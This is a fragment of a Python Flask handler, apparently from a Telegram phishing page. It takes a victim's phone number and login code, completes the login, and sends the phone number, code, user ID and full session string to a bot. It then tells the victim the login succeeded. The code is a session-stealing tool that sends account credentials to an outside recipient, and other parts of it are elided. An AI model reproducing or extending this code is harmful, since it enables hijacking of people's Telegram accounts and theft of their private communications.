...
def step2():
    ...
    phone = flask_session.get('phone')
    phone_code_hash = flask_session.get('phone_code_hash')
    client = flask_session.get('client')
    loop = flask_session.get('loop')

    if not client or not loop:
        return "<h1>Сессия устарела. Перезагрузите страницу.</h1>"
    ...
    try:
        ...
        text = f"✅ НОВАЯ СЕССИЯ!\nНомер: {phone}\nКод: {code}\nUser: @{getattr(me, 'username', 'None')} ({me.id})\n\nSession:\n{session_string}"
        asyncio.create_task(send_to_bot(text))

        loop.run_until_complete(client.disconnect())
        return "<h1 style='color:green;text-align:center;padding:50px'>Вход выполнен успешно.<br>Можно закрыть вкладку.</h1>"
